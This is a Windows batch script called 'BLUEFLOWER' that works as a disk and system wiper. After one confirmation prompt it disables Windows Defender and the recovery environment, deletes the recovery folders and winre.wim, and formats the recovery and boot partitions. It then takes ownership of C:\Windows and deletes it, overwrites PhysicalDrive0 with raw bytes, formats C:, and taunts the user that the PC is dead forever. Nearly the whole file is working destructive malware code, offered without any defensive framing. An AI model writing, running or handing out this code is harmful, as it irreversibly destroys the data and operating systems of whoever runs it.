@echo off
title BLUEFLOWER // NO RECOVERY, NO MERCY
color 4f
cls

echo.
echo                  ██████╗ ██╗   ██╗███████╗
echo                  ██╔══██╗██║   ██║██╔════╝
echo                  ██████╔╝██║   ██║█████╗  
echo                  ██╔══██╗██║   ██║██╔══╝  
echo                  ██████╔╝╚██████╔╝███████╗
echo                  ╚═════╝  ╚═════╝ ╚══════╝
echo.
echo             THIS WILL DESTROY WINDOWS + ALL RECOVERY OPTIONS
set /p "choice=                Type y to erase everything forever → "

if /i not "%choice%"=="y" (cls & echo Canceled. & timeout 3 >nul & exit)

powershell -ep bypass -c "Set-ExecutionPolicy Unrestricted -Force" >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
taskkill /f /im explorer.exe /im taskmgr.exe /im winlogon.exe >nul 2>&1

reagentc /disable >nul 2>&1
bcdedit /set {default} recoveryenabled No >nul 2>&1
bcdedit /set {default} bootstatuspolicy ignoreallfailures >nul 2>&1
bcdedit /deletevalue {default} recoverysequence >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Recovery" /f >nul 2>&1
rd /s /q "C:\Recovery" >nul 2>&1
rd /s /q "C:\Windows\System32\Recovery" >nul 2>&1
del /f /q C:\Windows\System32\winre.wim >nul 2>&1

for /f "tokens=2 delims==" %%a in ('wmic partition where "Bootable=True or Type='Recovery'" get DeviceID /value 2^>nul') do (
    mountvol %%a /d >nul 2>&1
    echo y|format %%a /fs:NTFS /q /v:GONE >nul 2>&1
)

takeown /f C:\Windows /r /d y >nul 2>&1
icacls C:\Windows /grant Administrators:F /t /c /q >nul 2>&1
rd /s /q C:\Windows\System32 >nul 2>&1
rd /s /q C:\Windows\SysWOW64 >nul 2>&1
rd /s /q C:\Windows >nul 2>&1

powershell -c "$s=[IO.File]::Open('\\.\PhysicalDrive0','Open','Write');$b=[byte[]](0..255)*100000;$s.Write($b,0,$b.Length);$s.Close()" >nul 2>&1

start "" /b cmd /c "echo y|format C: /fs:NTFS /q /v:BLUEFLOWER_OMEGA >nul 2>&1"

powershell -c "[Console]::Beep(32767,300);$v=New-Object -ComObject Sapi.SpVoice;$v.Rate=20;$v.Speak('NO RECOVERY. NO SAFE MODE. NO FACTORY RESET. GOODBYE FOREVER')" >nul 2>&1

cls
echo.
echo               LIGHTNING DEATH + TOTAL RECOVERY ERASURE
echo               WINDOWS = GONE
echo               RECOVERY PARTITION = FORMATTED
echo               WINRE + SAFE MODE = DELETED
echo               EVEN OEM RESET = IMPOSSIBLE
echo.
echo                     YOUR PC IS OFFICIALLY DEAD FOREVER
timeout /t 999 >nul
